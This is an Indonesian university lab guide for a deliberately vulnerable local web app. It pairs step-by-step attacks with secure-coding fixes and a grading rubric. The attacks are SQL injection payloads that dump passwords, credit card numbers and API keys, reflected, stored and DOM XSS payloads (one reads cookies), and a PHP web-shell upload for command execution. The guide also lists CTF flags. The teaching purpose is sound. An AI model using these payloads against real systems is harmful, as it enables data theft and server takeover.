# PANDUAN PELAKSANAAN PRAKTIKUM CYBERSECURITY: SECLAB (MYSQL & PHPMYADMIN EDITION)

**Mata Kuliah:** Keamanan Aplikasi Web & Praktik Ethical Hacking  
**Target Kasus Nyata:** Simulasi Kebocoran Data Sensitif Perusahaan (NIK KTP, Gaji, Nomor Kartu Kredit, Password, dan API Secret Flag).  
**Database:** MySQL Server (`seclab_db`) via phpMyAdmin / XAMPP.  
**Durasi:** 150 Menit (1 Sesi Praktikum).

---

## 1. Persiapan Lab & Setup Database di phpMyAdmin

1. Jalankan **XAMPP Control Panel**, pastikan modul **Apache** dan **MySQL** berstatus **Running (Hijau)**.
2. Buka browser ke **phpMyAdmin**: `http://localhost/phpmyadmin`.
3. Buka tab **Import**, pilih file:
   ```
   C:\xampp\htdocs\seclab-cybersecurity\seclab_mysql.sql
   ```
   Lalu klik **Import**. Database `seclab_db` akan terbuat secara otomatis dengan 3 tabel utama:
   * **`users`**: Tabel kredensial karyawan & data sensitif (NIK, Gaji, Kartu Kredit, Password, API Secret).
   * **`comments`**: Tabel diskusi publik (penampung data serangan Stored XSS).
   * **`products`**: Tabel katalog barang (referensi target UNION injection).
4. Akses platform latihan:
   ```
   http://localhost/seclab-cybersecurity/index.php
   ```

---

## 2. Pembuktian Data Nyata & Audit (Live DB Inspector)

Instruktur atau mahasiswa dapat membuka menu **Live DB Inspector (phpMyAdmin)** pada sidebar untuk melihat tabel fisik MySQL secara live:
* Membuktikan bahwa saat injeksi berhasil dieksekusi, data yang tampil di layar aplikasi 100% cocok dengan rekaman tabel di phpMyAdmin.

---

## 3. Modul Praktikum & Skenario Serangan (Red Team)

### Modul 1: SQL Injection (Data Breach Simulation)
* **Tujuan:** Membocorkan data gaji pimpinan, nomor kartu kredit, NIK KTP, password plaintext, dan API secret key dari database MySQL `seclab_db`.
* **Skenario 1 - Boolean-Based Bypass (Tampilkan Semua Karyawan):**
  Input pada form pencarian:
  ```sql
  ' OR 1=1 #
  ```
* **Skenario 2 - UNION-Based Data Exfiltration (Membocorkan Kolom Rahasia):**
  Ekstraksi kartu kredit & flag admin:
  ```sql
  ' UNION SELECT id, fullname, password, credit_card, api_secret_key FROM users #
  ```
* **Secret Flag yang Didapat:**
  * Super Admin: `FLAG{sql1_b0c0r_d4t4_kr3d3ns14l_m4st3r}`
  * Lead DevOps: `FLAG{k3b0c0r4n_4p1_k3y_s3rv3r_pr0d}`
  * Direktur Finance: `FLAG{d4t4_g4j1_d4n_k4rtu_kr3d1t_l34k}`

---

### Modul 2: Reflected Cross-Site Scripting (XSS)
* **Tujuan:** Eksekusi skrip JavaScript client-side melalui parameter input GET `q`.
* **Payload:**
  ```html
  <script>alert('Reflected-XSS-Active: ' + document.domain)</script>
  ```
  Atau payload HTML5 image:
  ```html
  <img src=x onerror="alert('Cookie: ' + document.cookie)">
  ```

---

### Modul 3: Stored Cross-Site Scripting (Tersimpan Nyata di MySQL)
* **Tujuan:** Menyimpan skrip malware secara permanen ke dalam tabel MySQL `comments`.
* **Langkah:**
  1. Masukkan Nama: `Hacker`
  2. Masukkan Email: `attacker@evil.id`
  3. Masukkan Pesan:
     ```html
     <img src=invalid onerror="alert('Stored XSS Pwned! Rekor tersimpan di MySQL seclab_db')">
     ```
  4. Klik **Kirim Komentar ke MySQL**.
  5. Cek di phpMyAdmin tabel `comments`, perhatikan bahwa payload tersimpan di kolom `message`.
  6. Setiap pengunjung yang membuka halaman tersebut akan otomatis terkena serangan pop-up.

---

### Modul 4: DOM-Based Cross-Site Scripting
* **Tujuan:** Eksekusi script murni di sisi browser tanpa payload dikirim ke server.
* **Langkah:** Tambahkan hash pada URL browser:
  ```
  http://localhost/seclab-cybersecurity/index.php?page=xss_dom#<img src=1 onerror=alert('DOM_XSS_Active')>
  ```

---

### Modul 5: Insecure File Upload (Web Shell ke RCE)
* **Tujuan:** Mendapatkan Remote Command Execution (RCE) dengan mengunggah skrip PHP ke web server.
* **Langkah:**
  1. Buka file `sample_materials/webshell.php`.
  2. Unggah file tersebut melalui modul Upload File.
  3. Akses URL file yang terupload dengan menambahkan parameter perintah:
     ```
     http://localhost/seclab-cybersecurity/uploads/webshell.php?cmd=whoami
     ```
     atau
     ```
     http://localhost/seclab-cybersecurity/uploads/webshell.php?cmd=dir
     ```

---

## 4. Remediasi & Pertahanan (Blue Team / Secure Coding)

Mahasiswa dapat menekan tombol **Switch ke Secure Mode (Patched)** di header aplikasi untuk melihat implementasi kode yang aman:

1. **SQLi Mitigation (Prepared Statements):**
   ```php
   $stmt = $mysqli->prepare("SELECT id, fullname, username, email, role FROM users WHERE username = ?");
   $stmt->bind_param("s", $userInput);
   $stmt->execute();
   ```
2. **XSS Mitigation (Output Encoding):**
   ```php
   echo htmlspecialchars($rawText, ENT_QUOTES, 'UTF-8');
   ```
3. **DOM XSS Mitigation (Safe DOM Sink):**
   ```javascript
   element.textContent = "Data: " + decodeURIComponent(hashValue);
   ```
4. **File Upload Hardening:**
   * Whitelist format berkas: `['jpg', 'jpeg', 'png', 'pdf']`.
   * Ganti nama acak: `bin2hex(random_bytes(16)) . '.' . $ext`.
   * Validasi MIME type asli via `finfo_file()`.

---

## 5. Rubrik Penilaian Mahasiswa

| Komponen Penilaian | Bobot | Kriteria Evaluasi |
|---|---|---|
| **Eksploitasi Red Team** | 40% | Berhasil mengekstraksi data bocor (NIK, Gaji, Flag) dan membuktikan eksekusi XSS / Web Shell. |
| **Analisis Root Cause** | 25% | Menjelaskan baris kode yang rentan pada masing-masing modul. |
| **Implementasi Patching** | 25% | Menguji dan membuktikan bahwa eksploitasi gagal pada *Secure Mode*. |
| **Laporan Praktikum** | 10% | Laporan analitis, screenshot pembuktian phpMyAdmin, dan kesimpulan. |
